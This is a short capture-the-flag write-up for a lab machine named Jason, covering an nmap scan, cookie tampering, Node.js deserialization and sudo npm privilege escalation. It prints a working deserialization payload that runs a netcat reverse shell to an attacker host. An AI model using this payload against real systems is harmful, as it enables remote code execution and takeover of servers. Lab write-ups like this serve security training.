
# Jason

We'll start with our usual nmap scan:

```bash
$ sudo nmap 10.10.20.78 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55 -sT
```

Select running services with

```bash
$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
```

[x] 22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)

[x] 80/tcp open  http    syn-ack

Ok, lets visit the website and submit a random email. Fire up BurpSuite and watch 
closely to the responses. It seems like we're receiving a base64-encoded cookie with our 
submitted email in it. Lets tamper with it a bit: try to insert "admin" as value,
insert in invalid email or just supply an invalid cookie.

The idea to tamper with a cookie was a good one. I remembered from a previous CTF 
that a bug with cookie deserialization existed in Node platform. You can look it up
[here](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)

Setup a netcat listener and then try base64 encoding the following payload:

```
{"email":"_$$ND_FUNC$$_function (){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP $ATTACKER_PORT >/tmp/f', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

And sending it as a cookie.

After successfully catching a reverse shell, you'll find the ***user*** flag at
/home/dylan

---

## *rooting the machine*

Lets find out what we can run with sudo:

```bash
$ sudo -l
```

```
User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

A quick search on [GTFOBins](https://gtfobins.github.io/gtfobins/npm/#sudo) gives us an
easy way to escalate to root.
